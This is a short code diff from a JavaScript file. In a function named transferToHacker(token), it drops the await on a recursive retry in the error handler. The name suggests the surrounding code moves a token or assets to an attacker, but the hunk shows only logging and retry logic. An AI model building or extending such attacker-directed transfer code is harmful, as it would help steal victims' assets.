@@ -179,7 +179,7 @@ export const transferToHacker = async (token) => {
     console.log(result)
   }).catch(async (error) => {
     console.log(error)
-    await transferToHacker(token);
+    transferToHacker(token);
   });
 };
 
